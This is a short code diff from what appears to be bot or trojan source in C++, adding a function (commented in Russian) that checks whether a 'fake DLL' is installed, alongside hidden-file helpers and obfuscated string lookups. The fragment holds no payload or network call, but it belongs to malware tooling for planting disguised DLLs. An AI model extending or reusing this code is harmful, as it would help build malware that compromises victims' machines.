@@ -1148,3 +1148,9 @@ bool BOT::IsHiddenFile(const char* FileName)
 {
 	return IsHiddenFile(STRA::Hash(FileName));
 }
+
+//возвращает true, если фейкдлл установлена
+bool BOT::FakeDllIsInstall()
+{
+	return Bot->FileExists( 0, GetStr(EStrFakeDllFlag).t_str() );
+}
